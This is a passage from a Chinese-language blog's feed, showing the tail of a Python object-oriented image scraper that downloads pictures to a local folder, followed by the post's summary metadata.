class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            file_name = <span class="string">&quot;E:/大学/python面向对象爬虫/&quot;</span>+ <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            urlretrieve(url, file_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        titile_url = self.Geturl()</span><br><span class="line">        respons = self.Respons(titile_url)</span><br><span class="line">        picture = self.clear(respons)</span><br><span class="line">        <span class="built_in">print</span>(picture)</span><br><span class="line">        download = self.save(picture)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tupian = Tupian()</span><br><span class="line">    tupian.run()</span><br></pre></td></tr></table></figure><p>使用效果差不多，但缺少选择分类</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 爬虫与面向对象爬虫&lt;br&gt;author: A.bin&lt;br&gt;cover: /img/5.jpg&lt;br&gt;top_img: /img/7.jpg&lt;br&gt;tags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘-爬虫 -面向对象’&lt;br&gt;categories:&lt;/li&gt;
&lt;li&gt;‘</summary>
      
    
    
    
    
  </entry>
  
</feed>
